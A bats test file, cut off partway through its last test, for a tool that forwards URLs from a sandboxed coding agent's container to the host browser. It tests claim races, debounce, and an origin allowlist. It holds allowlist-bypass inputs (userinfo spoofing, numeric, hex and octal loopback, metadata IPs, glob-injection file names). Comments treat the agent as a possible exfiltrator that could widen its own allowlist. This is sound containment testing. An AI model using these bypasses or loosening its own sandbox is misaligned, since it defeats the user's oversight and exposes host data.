#!/usr/bin/env bats
# ── Browser bridge (_browser_claim_url) ───────────────────────────────────────
#
# The host-side watcher forwards URLs written by the container's open-bridge shim
# to the host browser. Each pending URL must be opened EXACTLY ONCE even when
# several watchers are alive on the same bridge dir (an orphan left by a crashed
# session plus the current one). `_browser_claim_url` enforces that with an atomic
# rename: whoever wins the `mv` opens the URL; everyone else gets nothing.
load "../setup"
setup() {
  _common_setup
  source_cli
  BRIDGE="$TEST_TEMP/.browser-open"
}
teardown() { _common_teardown; }

@test "browser bridge: claims a pending URL and consumes the file" {
  printf '%s\n' "https://example.com/x" > "$BRIDGE"
  run _browser_claim_url "$BRIDGE"
  assert_success
  assert_output "https://example.com/x"
  [ ! -f "$BRIDGE" ]  || return 1   # file consumed
}

@test "browser bridge: returns nonzero when there is nothing to claim" {
  run _browser_claim_url "$BRIDGE"   # no file exists
  assert_failure
  assert_output ""
}

@test "browser bridge: a URL is claimed by exactly ONE of two racing watchers" {
  printf '%s\n' "https://example.com/once" > "$BRIDGE"
  # First watcher wins the claim.
  run _browser_claim_url "$BRIDGE"
  assert_success
  assert_output "https://example.com/once"
  # Second watcher (the orphan) finds nothing → one host tab, not two.
  run _browser_claim_url "$BRIDGE"
  assert_failure
  assert_output ""
}

@test "browser bridge: consuming an empty bridge file is harmless" {
  : > "$BRIDGE"   # empty file
  run _browser_claim_url "$BRIDGE"
  assert_success
  assert_output ""
  [ ! -f "$BRIDGE" ]  || return 1
}

@test "browser bridge: the claim read is bounded" {
  # The box picks the file's size. An unbounded `cat` put the whole thing in a
  # shell variable and then on an `echo` into the log. The cap is far above the
  # 2048 bytes _bridge_url_host accepts, so nothing openable is ever cut.
  printf 'https://claude.ai/%s' "$(printf 'a%.0s' $(seq 1 20000))" > "$BRIDGE"
  run _browser_claim_url "$BRIDGE"
  assert_success
  [ "${#output}" -le 8192 ] || { echo "the claim read ${#output} bytes from a box-sized file"; return 1; }
}

@test "browser bridge: leaves no .opening temp file behind" {
  printf '%s\n' "https://example.com/y" > "$BRIDGE"
  _browser_claim_url "$BRIDGE" >/dev/null
  run bash -c "ls \"$TEST_TEMP\"/.browser-open.opening.* 2>/dev/null"
  assert_output ""
}

@test "browser bridge: watcher self-exits when its run dir is removed (orphan cleanup)" {
  # The fix's anti-orphan half: a watcher left behind by a crashed session must
  # stop polling once its run dir is gone (cleat rm/clean/nuke), instead of
  # spinning forever and re-opening URLs. Delete the `[ -d "$clip_dir" ]` guard
  # in _browser_watcher and this test fails (mutation-verified).
  local clip_dir="$TEST_TEMP/clip"
  mkdir -p "$clip_dir"
  _browser_watcher "$clip_dir" "true" "" >/dev/null 2>&1 &
  local wpid=$!
  sleep 1.5                                   # let it enter the poll loop
  kill -0 "$wpid" 2>/dev/null  || { echo "watcher exited prematurely"; return 1; }
  rm -rf "$clip_dir"                           # session removed → orphan must stop
  local i alive=1
  for i in 1 2 3 4 5 6 7 8 9 10; do
    if ! kill -0 "$wpid" 2>/dev/null; then alive=0; break; fi
    sleep 0.5
  done
  [ "$alive" = 1 ] && kill "$wpid" 2>/dev/null
  [ "$alive" = 0 ]  || { echo "watcher kept spinning after clip_dir removal"; return 1; }
}

@test "browser bridge: two distinct URLs both open (no same-second drop)" {
  # The old mtime-second dedup dropped a 2nd URL written in the same wall-clock
  # second. Consuming the file removes that failure mode: both are claimable.
  printf '%s\n' "https://example.com/a" > "$BRIDGE"
  run _browser_claim_url "$BRIDGE"
  assert_output "https://example.com/a"
  printf '%s\n' "https://example.com/b" > "$BRIDGE"   # same second in a fast test
  run _browser_claim_url "$BRIDGE"
  assert_output "https://example.com/b"
}

# ── Same-URL debounce (atomic per-URL marker) ─────────────────────────────────
# One user action can write the bridge file SEVERAL times (a TUI link click
# fires the open shim on press and release). The claim makes each write open
# once; the debounce makes each URL open once per window even across multiple
# writes claimed by DIFFERENT watchers: the one-click-N-tabs bug. The debounce is
# an atomic `mkdir` of a per-URL marker dir (not a read-then-write stamp), so two
# racing watchers can't both pass it. Markers self-expire by their own mtime.

@test "browser bridge: a repeat of the same URL inside the window is deduped" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure   # first sighting → open it (and claim the marker)
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_success   # immediate repeat → suppressed
}

@test "browser bridge: a different URL is never debounced" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure
  run _browser_recently_opened "$dir" "https://example.com/y"
  assert_failure   # distinct URL right after → still opens
}

@test "browser bridge: concurrent watchers open one URL exactly once (atomic debounce)" {
  # The one-click-TWO-tabs bug that survived the atomic claim. Two writes of the
  # SAME url (press + release) claimed by two live watchers (a login alongside a
  # session, two shells on one box, or a leaked orphan) both used to pass the old
  # read-then-write stamp before either wrote it. The atomic mkdir claim must
  # elect exactly ONE opener no matter how many fire at once. Mutation-verified
  # (mkdir → mkdir -p makes the claim non-exclusive and this fails).
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  local n=24 i wins
  local results="$TEST_TEMP/race_wins"; : > "$results"
  local go="$TEST_TEMP/race_go"
  for i in $(seq 1 "$n"); do
    ( while [ ! -f "$go" ]; do :; done            # barrier: maximise overlap
      if _browser_recently_opened "$dir" "https://example.com/race"; then :; else
        echo win >> "$results"                    # rc 1 = "open it" = a winner
      fi
    ) &
  done
  sleep 0.2                                        # let every racer reach the barrier
  touch "$go"
  wait
  wins="$(grep -c win "$results" 2>/dev/null)"; wins="${wins:-0}"
  [ "$wins" -eq 1 ] || { echo "expected exactly 1 opener across $n racers, got $wins"; return 1; }
}

@test "browser bridge: the same URL opens again once the window has passed" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure                                   # first sighting opens, claims a marker
  local m
  for m in "$dir"/.open.*; do touch -t 200001010000 "$m" 2>/dev/null || true; done
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure   # marker predates the window → swept → opens again normally
}

@test "browser bridge: a leftover marker with no readable time fails open (never wedges)" {
  # A marker left in a broken state (mtime unreadable → treated as epoch 0, far
  # past the window) must be swept, never permanently suppress a URL.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  local hash; hash="$(printf '%s' "https://example.com/x" | cksum)"; hash="${hash// /_}"
  mkdir -p "$dir/.open.$hash"
  touch -t 200001010000 "$dir/.open.$hash" 2>/dev/null || true
  run _browser_recently_opened "$dir" "https://example.com/x"
  assert_failure   # ancient/broken marker must never block an open
}

@test "browser bridge: the watcher consults the debounce before opening" {
  # Retargeted onto an allowlisted origin and an auth-shaped URL. It protected
  # the ORDERING (the debounce is consulted before anything opens), and that is
  # unchanged. The fixture moved because a plain link at example.com is now
  # refused by the destination gate, so it could never reach the opener and the
  # ordering would go untested.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _browser_recently_opened() { touch "$TEST_TEMP/debounce_consulted"; return 1; }
  cat > "$TEST_TEMP/fake_open" <<EOF
#!/usr/bin/env bash
echo "\$1" >> "$TEST_TEMP/opened.log"
EOF
  chmod +x "$TEST_TEMP/fake_open"
  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7                                  # let it pass the startup rm -f
  printf '%s' "https://claude.ai/oauth/authorize?redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Fcb" > "$dir/.browser-open"
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -f "$TEST_TEMP/opened.log" ] && break
    sleep 0.5
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
  [ -f "$TEST_TEMP/opened.log" ]        || { echo "URL never opened"; return 1; }
  [ -f "$TEST_TEMP/debounce_consulted" ] || { echo "watcher skipped the debounce"; return 1; }
}

@test "browser bridge: watcher self-exits when its spawning cleat process dies" {
  # The accumulation half of the one-click-N-tabs bug: a watcher whose cleat
  # process was SIGKILL'd (closed terminal) skips the cleanup trap and used to
  # poll forever: every crashed session added one more tab per click. The
  # liveness check reaps it within a poll tick.
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  cat > "$TEST_TEMP/spawner.sh" <<EOF
source "$TEST_TEMP/cli_stripped"
_browser_watcher "$dir" "true" "" >/dev/null 2>&1 &
echo "\$!" > "$TEST_TEMP/watcher_pid"
kill -9 \$\$
EOF
  sed 's/^set -euo pipefail$/:/' "$CLI" > "$TEST_TEMP/cli_stripped"
  bash "$TEST_TEMP/spawner.sh" 2>/dev/null || true
  local wpid dead=0
  wpid="$(cat "$TEST_TEMP/watcher_pid")"
  process_exited "$wpid" && dead=1
  # Unconditional reap: a live straggler holds bats' fd and hangs the file.
  kill "$wpid" 2>/dev/null || true
  [ "$dead" = 1 ] || { echo "watcher outlived its dead parent"; return 1; }
}

# ── No-duplicate bridge policy (CLEAT_BROWSER_BRIDGE) ──────────────────────────
# A clicked link is opened by the HOST TERMINAL itself (it makes URLs clickable);
# the in-container `open` shim ALSO writes the bridge, so the watcher opening it
# again is a second tab ~0.5s later. The watcher cannot see the terminal's open,
# so on an interactive terminal it DEFERS plain links to the terminal. Auth URLs
# (a localhost OAuth callback the user never clicks) and non-interactive sessions
# (nothing else opens them) always open via the bridge. CLEAT_BROWSER_BRIDGE
# overrides: always = open everything (pre-toggle behavior), off = open nothing.

@test "bridge mode: defaults to auto when unset" {
  unset CLEAT_BROWSER_BRIDGE
  run _browser_bridge_mode
  assert_output "auto"
}

@test "bridge mode: honors always and off, and falls back to auto on a typo" {
  CLEAT_BROWSER_BRIDGE=always run _browser_bridge_mode
  assert_output "always"
  CLEAT_BROWSER_BRIDGE=off run _browser_bridge_mode
  assert_output "off"
  CLEAT_BROWSER_BRIDGE=banana run _browser_bridge_mode    # unknown never wedges
  assert_output "auto"
}

@test "bridge policy: auto DEFERS a plain link on an interactive terminal (no duplicate)" {
  # mode=auto, host_opens_clicks=1, is_auth=0 -> the terminal owns it -> defer.
  run _browser_should_open auto 1 0
  assert_failure
}

@test "bridge policy: auto OPENS an auth URL even on an interactive terminal" {
  # Retargeted for the destination gate. It protected the rule that the user
  # never clicks an auth URL, so the bridge and the callback proxy own it. That
  # rule is unchanged, but the call now carries a fourth argument: an auth URL
  # at a destination that is NOT on the allowlist opens nothing, which is what
  # the gate exists for. The is_auth=1, dest=0 case has its own test below.
  run _browser_should_open auto 1 1 1
  assert_success
}

@test "bridge policy: auto DEFERS a plain link when no terminal is attached" {
  # Retargeted, and this one is a behaviour CHANGE rather than a new argument.
  # It protected "off a TTY nothing else opens the link, so the bridge must".
  # That window is cleat login (host_opens_clicks=0 unconditionally), a pipe,
  # cron, CI and nohup, which is the unattended overnight run. With nobody
  # watching the browser there is no user value in opening a plain link the box
  # chose, and it is exactly the exfiltration primitive. `always` restores the
  # old behaviour in one line for anyone who wants it, which the test below pins.
  run _browser_should_open auto 0 0 1
  assert_failure
  run _browser_should_open always 0 0 1
  assert_success
}

@test "bridge policy: always opens every URL; off opens none" {
  run _browser_should_open always 1 0   # plain + interactive: forced open
  assert_success
  run _browser_should_open always 0 0
  assert_success
  run _browser_should_open off 0 1      # even an auth URL: off opens nothing
  assert_failure
  run _browser_should_open off 0 0
  assert_failure
}

# ── _is_auth_url: OAuth URL classification ──────────────────────────────────
# Auth means an allowlisted origin plus a query redirect_uri that decodes to an
# absolute http(s) URL, NOT "has a loopback callback": Claude Code's code-paste
# login flow points redirect_uri at platform.claude.com (console.anthropic.com
# in older releases) and still must auto-open (the user cannot click a URL
# claude emits programmatically through the open shim).

@test "auth url: loopback authorize URL classifies as auth" {
  run _is_auth_url "https://claude.ai/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback&scope=a"
  assert_success
}

@test "auth url: code-paste authorize URL (console callback, no loopback) classifies as auth" {
  run _is_auth_url "https://claude.ai/oauth/authorize?code=true&client_id=x&redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Foauth%2Fcode%2Fcallback&scope=user"
  assert_success
}

@test "auth url: redirect_uri as the first query param classifies as auth" {
  # Retargeted onto an allowlisted origin. It protected the PARSING rule, that
  # redirect_uri is recognised when it is the first query parameter (a `?`
  # rather than an `&` in front of it), and that half is unchanged. The origin
  # moved because auth now requires one: example.test is not somewhere Cleat
  # will point a browser, so the old fixture can no longer be auth by
  # definition. The `?`-versus-`&` distinction is what this test still guards.
  run _is_auth_url "https://claude.ai/authorize?redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Fcb"
  assert_success
  run _is_auth_url "https://claude.ai/authorize?a=1&redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Fcb"
  assert_success
}

@test "auth url: plain links do not classify as auth" {
  run _is_auth_url "https://example.com/docs/oauth"
  assert_failure
  run _is_auth_url "https://example.com/redirect_uris"
  assert_failure
  # redirect_uri in the PATH, not as a query param, is not an OAuth request
  run _is_auth_url "https://example.com/path/redirect_uri=abc"
  assert_failure
}


# ── the destination gate ────────────────────────────────────────────────────
#
# The box writes a URL and the HOST opens it, in the host's browser, with the
# host's cookies. Everything below is about the one question that gate answers:
# where is that browser allowed to go.

@test "url host: parses the authority out of an ordinary URL" {
  run _bridge_url_host "https://claude.ai/oauth/authorize?x=1#frag"
  assert_success
  assert_output "claude.ai"
}

@test "url host: folds case, because DNS does and bash 3.2 has no \${var,,}" {
  run _bridge_url_host "HTTPS://CLAUDE.AI/x"
  assert_success
  assert_output "claude.ai"
}

@test "url host: userinfo is rejected, never stripped" {
  # https://claude.ai@evil.example/ has the ATTACKER's host to the right of the
  # @. Taking ${authority%%@*} hands back `claude.ai`, which is the name they
  # chose for exactly this reason.
  run _bridge_url_host "https://claude.ai@evil.example/"
  assert_failure
  run _bridge_url_host "https://user:pw@evil.example/"
  assert_failure
}

@test "url host: a port is cut, an IPv6 literal is refused" {
  run _bridge_url_host "https://claude.ai:8443/x"
  assert_success
  assert_output "claude.ai"
  # Success must always mean "this is a hostname" for every later caller.
  run _bridge_url_host "https://[::1]/x"
  assert_failure
  run _bridge_url_host "http://[2606:4700::1111]:8080/"
  assert_failure
}

@test "url host: only http and https, and only up to 2048 bytes" {
  local scheme
  for scheme in ftp file javascript data; do
    run _bridge_url_host "${scheme}://claude.ai/x"
    assert_failure
  done
  run _bridge_url_host "https://"
  assert_failure
  run _bridge_url_host "https://$(printf 'a%.0s' $(seq 1 3000)).example.com/"
  assert_failure
}

@test "url host: an authority byte outside the charset is refused" {
  # One rule covers a percent-encoded authority, a backslash, an underscore, a
  # space and every non-ASCII confusable.
  run _bridge_url_host "https://claude%2eai.evil.example/"
  assert_failure
  run _bridge_url_host "https://claude.ai\\@evil.example/"
  assert_failure
  run _bridge_url_host "https://claude_ai.example/"
  assert_failure
  run _bridge_url_host "https://xn--clude-mua.ai/"   # punycode is ASCII, so it parses
  assert_success
}

@test "url host: a trailing dot is a different string for the same name" {
  # claude.ai. resolves and never equals the list entry claude.ai.
  run _bridge_url_host "https://claude.ai./x"
  assert_failure
  run _bridge_url_host "https://.claude.ai/x"
  assert_failure
  run _bridge_url_host "https://claude..ai/x"
  assert_failure
}

@test "origin gate: every shipped origin is allowed by exact host" {
  local o
  for o in $_BROWSER_ORIGINS; do
    run _bridge_dest_allowed "https://${o}/some/path?q=1"
    assert_success
  done
}

@test "origin gate: the shipped list is exactly the catalogued set" {
  # The test above loops over the list itself, so it proves the gate matches
  # whatever the list holds. This pins what it holds: a dropped vendor stops
  # auto-opening its login, and an added host widens what the box can open.
  run bash -c 'printf "%s\n" $1 | LC_ALL=C sort' _ "$_BROWSER_ORIGINS"
  assert_success
  assert_output "$(printf '%s\n' \
    accounts.google.com app.netlify.com app.planetscale.com app.pulumi.com \
    app.terraform.io auth.openai.com claude.ai claude.com cli-auth.heroku.com \
    console.anthropic.com dash.cloudflare.com github.com gitlab.com \
    login.docker.com login.microsoftonline.com microsoft.com \
    platform.claude.com sentry.io www.npmjs.com)"
}

@test "origin gate: a near miss is not a match" {
  # Exact membership, never a suffix: a *claude.ai pattern also matches
  # evilclaude.ai, which is how an origin allowlist usually fails.
  local bad
  for bad in evilclaude.ai claude.ai.evil.tld githubb.com github.com.evil.tld \
             wwww.npmjs.com npmjs.com sub.claude.ai; do
    run _bridge_dest_allowed "https://${bad}/x"
    assert_failure
  done
}

@test "origin gate: api.anthropic.com is deliberately NOT on the list" {
  # An API host is never a browser destination. Including it is the
  # API-versus-browser confusion that widens the surface and still fails to work.
  run _bridge_dest_allowed "https://api.anthropic.com/v1/messages"
  assert_failure
}

@test "origin gate: loopback and private space are refused on the opened URL" {
  # Allowed by the list and still refused. Without this the rule would be
  # indistinguishable from "none of these happen to be shipped defaults", and a
  # user could hand the box an authenticated navigation into a service on their
  # own machine with one env var.
  CLEAT_BROWSER_ORIGINS="localhost 127.0.0.1 10.1.2.3 192.168.1.1 172.16.0.1 printer.local"
  local h
  for h in localhost 127.0.0.1 127.1.2.3 0.0.0.0 169.254.169.254 \
           10.1.2.3 192.168.1.1 172.16.0.1 172.31.255.1 printer.local; do
    run _bridge_dest_allowed "http://${h}:8080/x"
    assert_failure
  done
  # Outside the private ranges, so only the allowlist decides.
  run _bridge_host_is_local "172.15.0.1"
  assert_failure
  run _bridge_host_is_local "172.32.0.1"
  assert_failure

  # The env and config readers already drop a local host before it reaches the
  # list, so the loop above cannot tell whether _bridge_dest_allowed's OWN
  # loopback check does any work: the origin check would deny it anyway. That is
  # the shape a mutation cannot see. Force the origin check to PASS, so the only
  # thing that can still refuse a loopback or private host is the check inside
  # _bridge_dest_allowed. Removing that line then OPENS the URL, which is the
  # whole danger: an authenticated navigation into a service on the host.
  _bridge_origin_allowed() { return 0; }
  for h in localhost sub.localhost 127.0.0.1 127.1.2.3 0.0.0.0 \
           169.254.169.254 10.1.2.3 192.168.1.1 172.16.0.1 172.31.255.1 \
           printer.local 2130706433 0177.0.0.1; do
    run _bridge_dest_allowed "http://${h}:8080/x"
    assert_failure
  done
  # Control: a genuine public host with the origin check forced on still opens,
  # so the loop fails for the right reason and not because the stub denies all.
  run _bridge_dest_allowed "https://claude.ai/oauth"
  assert_success
}

@test "origin gate: an IPv4 address written as one number, in hex or in octal is refused" {
  # The loopback rule matched dotted text, and a browser does not. WHATWG URL
  # parsing reads 2130706433, 0x7f000001, 0177.0.0.1 and 127.1 as 127.0.0.1,
  # and 0 as 0.0.0.0, so each was an authenticated navigation into the host that
  # the text test waved through.
  local h
  for h in 2130706433 0x7f000001 0177.0.0.1 127.1 0 0x7f.0.0.1; do
    run cmd_browser allow "$h"
    assert_failure
  done
  CLEAT_BROWSER_ORIGINS="2130706433 0x7f000001 0177.0.0.1 127.1 0 0x7f.0.0.1"
  for h in 2130706433 0x7f000001 0177.0.0.1 127.1 0 0x7f.0.0.1; do
    run _bridge_dest_allowed "http://${h}:8080/x"
    assert_failure
  done
  # A plain dotted quad outside the ranges is still just a host the list decides.
  run _bridge_host_is_local "8.8.8.8"
  assert_failure
  run _bridge_host_is_local "203.0.113.255"
  assert_failure
}

@test "origin gate: a loopback redirect_uri VALUE still parses (hands-free login)" {
  # The loopback rule is about the authority of the URL that is OPENED. Applying
  # it to redirect_uri would kill the callback proxy and the login with it.
  run _extract_callback_port "https://claude.ai/oauth/authorize?redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback"
  assert_success
  assert_output "45454"
}

@test "origins env: CLEAT_BROWSER_ORIGINS APPENDS, it never replaces" {
  # The single most important property of this variable: a user who sets it to
  # add one origin must not silently lose claude.ai and break their own login.
  CLEAT_BROWSER_ORIGINS="auth.example.com"
  run _bridge_dest_allowed "https://auth.example.com/authorize"
  assert_success
  run _bridge_dest_allowed "https://claude.ai/oauth/authorize"
  assert_success
}

@test "origins env: commas, whitespace and full URLs are all accepted" {
  CLEAT_BROWSER_ORIGINS="a.example.com, https://b.example.com/ignored  c.example.com"
  local h
  for h in a.example.com b.example.com c.example.com; do
    run _bridge_dest_allowed "https://${h}/x"
    assert_success
  done
}

@test "origins env: an upper-case scheme is a scheme and a non-http one is refused" {
  # Only a lower-case http:// or https:// was recognised as a URL, so
  # HTTPS://a.example.com was read as a bare host and its host came back as
  # `https`, and ftp://b.example.com allowed a host called `ftp`. Same in the
  # config file and in cleat browser allow.
  CLEAT_BROWSER_ORIGINS="HTTPS://a.example.com ftp://b.example.com"
  mkdir -p "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  printf '[browser]\norigin = Http://c.example.com/\n' > "$CLEAT_GLOBAL_CONFIG"
  run _bridge_dest_allowed "https://a.example.com/x"
  assert_success
  run _bridge_dest_allowed "https://c.example.com/x"
  assert_success
  local h
  for h in https http ftp b.example.com; do
    run _bridge_dest_allowed "https://${h}/x"
    assert_failure
  done
  run _bridge_origins_from_env bad
  assert_output --partial "ftp://b.example.com"
  run cmd_browser allow HTTPS://d.example.com
  assert_success
  assert_output --partial "d.example.com"
  run cmd_browser allow ftp://e.example.com
  assert_failure
  run _bridge_dest_allowed "https://d.example.com/x"
  assert_success
}

@test "origins env: a malformed entry is dropped, never treated as a wildcard" {
  CLEAT_BROWSER_ORIGINS="*.example.com  evil example.com@attacker.tld  ok.example.com"
  run _bridge_dest_allowed "https://anything.example.com/x"
  assert_failure
  run _bridge_dest_allowed "https://attacker.tld/x"
  assert_failure
  run _bridge_dest_allowed "https://ok.example.com/x"
  assert_success
  # And it is named, or it reads as "I allowed it and it still does not work".
  run _bridge_origins_from_env bad
  assert_output --partial "*.example.com"
}

@test "origins env: a wildcard entry is never expanded against the working directory" {
  # The split was an unquoted `for e in $raw` with globbing on, and the watcher
  # runs in the project folder, which the box writes. A file named
  # `evil.tld#.example.com` turned `*.example.com` into an entry whose authority
  # is evil.tld, and `*` alone allowed every file name in the folder.
  mkdir -p "$TEST_TEMP/globcwd"
  : > "$TEST_TEMP/globcwd/evil.tld#.example.com"
  : > "$TEST_TEMP/globcwd/evil.example"
  cd "$TEST_TEMP/globcwd"
  CLEAT_BROWSER_ORIGINS="*.example.com *"
  run _bridge_dest_allowed "https://evil.tld/x"
  assert_failure
  run _bridge_dest_allowed "https://evil.example/x"
  assert_failure
  run _bridge_origins_from_env bad
  assert_output --partial "*.example.com"
  # Globbing is back on for the caller once the split is done.
  _bridge_origins_from_env ok > /dev/null
  local seen=( "$TEST_TEMP/globcwd"/evil.* )
  run printf '%s\n' "${#seen[@]}"
  assert_output "2"
}

@test "origins env: an absurd value is ignored rather than walked per claim" {
  CLEAT_BROWSER_ORIGINS="$(printf 'a.example.com %.0s' $(seq 1 400))"
  run _bridge_origins_from_env ok
  assert_output ""
  run _bridge_dest_allowed "https://claude.ai/x"
  assert_success
}

@test "origins config: the GLOBAL config adds an origin, the project .cleat never does" {
  # /workspace/.cleat is a file the caged agent edits as ordinary work, so an
  # allowlist it can write is not an allowlist. The trust prompt does not save
  # it either: that prompt's subject line names capabilities.
  #
  # The project file has to sit where a regression would read it. Written to a
  # directory nothing resolves, an ADDED project read passed this test. So the
  # project is resolved (_RESOLVED_PROJECT) and is the working directory, and
  # the global config exists, because its reader returns before any read when
  # the file is missing.
  mkdir -p "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  printf '[browser]\norigin = fromglobal.example.com\n' > "$CLEAT_GLOBAL_CONFIG"
  printf '[browser]\norigin = fromproject.example.com\n' > "$TEST_TEMP/.cleat"
  cd "$TEST_TEMP"
  _RESOLVED_PROJECT="$TEST_TEMP"
  CLEAT_BROWSER_ORIGINS="fromenv.example.com"
  run _bridge_dest_allowed "https://fromglobal.example.com/x"
  assert_success
  run _bridge_dest_allowed "https://fromenv.example.com/x"
  assert_success
  run _bridge_dest_allowed "https://fromproject.example.com/x"
  assert_failure
}

@test "origins config: cleat browser allow writes it and keeps the rest of the file" {
  mkdir -p "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  printf '[caps]\ndocker\n' > "$CLEAT_GLOBAL_CONFIG"
  run cmd_browser allow auth.example.com
  assert_success
  run _bridge_dest_allowed "https://auth.example.com/x"
  assert_success
  run cat "$CLEAT_GLOBAL_CONFIG"
  assert_output --partial "[caps]"
  assert_output --partial "docker"
  # Twice is idempotent, not a duplicate.
  run cmd_browser allow auth.example.com
  assert_success
  assert_output --partial "already allowed"
}

@test "origins config: cleat browser allow persists a host that is only in the env var" {
  # A host set for this shell through CLEAT_BROWSER_ORIGINS read as "already
  # allowed" and nothing was written, so the allow vanished with the variable.
  mkdir -p "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  : > "$CLEAT_GLOBAL_CONFIG"
  CLEAT_BROWSER_ORIGINS="envonly.example.com"
  run cmd_browser allow envonly.example.com
  assert_success
  refute_output --partial "already allowed"
  run cat "$CLEAT_GLOBAL_CONFIG"
  assert_output --partial "[browser]"
  assert_output --partial "origin = envonly.example.com"
  # A shipped origin is still already allowed and writes nothing.
  : > "$CLEAT_GLOBAL_CONFIG"
  run cmd_browser allow claude.ai
  assert_success
  assert_output --partial "already allowed"
  run cat "$CLEAT_GLOBAL_CONFIG"
  assert_output ""
}

@test "origins config: cleat browser allow keeps every origin added before it" {
  # The rewrite stored an existing line as everything after the word origin,
  # " = host", and wrote it back behind a fresh "origin = ". Each allow added one
  # more "= " to every earlier line, so only the newest origin still parsed. A
  # comment or another key in the section came back as an origin too.
  mkdir -p "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  printf '[browser]\n# added for the vpn login\nnote = keep me\norigin = seeded.example.com\n' > "$CLEAT_GLOBAL_CONFIG"
  run cmd_browser allow a.example.com
  assert_success
  run cmd_browser allow b.example.com
  assert_success
  local h
  for h in seeded.example.com a.example.com b.example.com; do
    run _bridge_dest_allowed "https://${h}/x"
    assert_success
  done
  run grep -c '= =' "$CLEAT_GLOBAL_CONFIG"
  assert_output "0"
  run cat "$CLEAT_GLOBAL_CONFIG"
  assert_output --partial "# added for the vpn login"
  assert_output --partial "note = keep me"
  refute_output --partial "origin = note"
  refute_output --partial "origin = #"
}

@test "origins config: cleat browser allow refuses a loopback host and a non-host" {
  run cmd_browser allow localhost
  assert_failure
  run cmd_browser allow 127.0.0.1
  assert_failure
  run cmd_browser allow "not a host"
  assert_failure
}

@test "origins: a loopback or private entry is listed as ignored, never as accepted" {
  # The gate never opens one, so showing it under the accepted origins reads as
  # "I allowed it and it still does not work".
  export CLEAT_BROWSER_ORIGINS="localhost auth.example.com"
  run _bridge_origins_from_env ok
  assert_output "auth.example.com"
  run _bridge_origins_from_env bad
  assert_output "localhost"
  mkdir -p "$(dirname "$CLEAT_GLOBAL_CONFIG")"
  printf '[browser]\norigin = 127.0.0.1\norigin = sso.example.com\n' > "$CLEAT_GLOBAL_CONFIG"
  run _bridge_origins_from_config ok
  assert_output "sso.example.com"
  run _bridge_origins_from_config bad
  assert_output "127.0.0.1"
}

@test "auth url: an allowlisted authorize URL still classifies as auth" {
  run _is_auth_url "https://claude.ai/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback&scope=a"
  assert_success
}

@test "auth url: the code-paste flow still classifies as auth" {
  # console.anthropic.com, no loopback callback. Claude 2.1.191+ hands the URL
  # only to \$BROWSER and never prints it, so deferring this one strands a login
  # with nothing on screen to recover from.
  run _is_auth_url "https://claude.ai/oauth/authorize?code=true&client_id=x&redirect_uri=https%3A%2F%2Fconsole.anthropic.com%2Foauth%2Fcode%2Fcallback&scope=user"
  assert_success
}

# The two shapes below are the URLs Claude Code 2.1.270 builds, copied from its
# authorize-URL builder: CLAUDE_AI_AUTHORIZE_URL is claude.com/cai/oauth/authorize,
# CONSOLE_AUTHORIZE_URL is platform.claude.com/oauth/authorize, and the manual
# flow's redirect_uri is platform.claude.com/oauth/code/callback. Neither host
# was on the shipped list, so the hands-free login was refused in every mode.

@test "auth url: the claude.ai login Claude Code opens today, on claude.com" {
  local loopback="https://claude.com/cai/oauth/authorize?code=true&client_id=9d1c250a-e61b-44d9-88ed-5944d1962f5e&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback&scope=user%3Ainference+user%3Aprofile&code_challenge=abc&code_challenge_method=S256&state=xyz"
  run _is_auth_url "$loopback"
  assert_success
  # And it earns the callback proxy, which is what makes the login hands-free.
  run _extract_callback_port "$loopback"
  assert_success
  assert_output "45454"
  run _is_auth_url "https://claude.com/cai/oauth/authorize?code=true&client_id=9d1c250a-e61b-44d9-88ed-5944d1962f5e&response_type=code&redirect_uri=https%3A%2F%2Fplatform.claude.com%2Foauth%2Fcode%2Fcallback&scope=user%3Ainference&code_challenge=abc&code_challenge_method=S256&state=xyz"
  assert_success
}

@test "auth url: the Console login Claude Code opens today, on platform.claude.com" {
  local loopback="https://platform.claude.com/oauth/authorize?code=true&client_id=9d1c250a-e61b-44d9-88ed-5944d1962f5e&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A45455%2Fcallback&scope=org%3Acreate_api_key+user%3Aprofile&code_challenge=abc&code_challenge_method=S256&state=xyz"
  run _is_auth_url "$loopback"
  assert_success
  run _extract_callback_port "$loopback"
  assert_success
  assert_output "45455"
  run _is_auth_url "https://platform.claude.com/oauth/authorize?code=true&client_id=9d1c250a-e61b-44d9-88ed-5944d1962f5e&response_type=code&redirect_uri=https%3A%2F%2Fplatform.claude.com%2Foauth%2Fcode%2Fcallback&scope=org%3Acreate_api_key&code_challenge=abc&code_challenge_method=S256&state=xyz"
  assert_success
}

@test "auth url: an unallowlisted origin is never auth, whatever it carries" {
  # The old test was a bare substring, so this was AUTH, and the auto branch
  # returned on is_auth BEFORE it consulted the terminal.
  run _is_auth_url "https://evil.example.com/pwn?redirect_uri=x"
  assert_failure
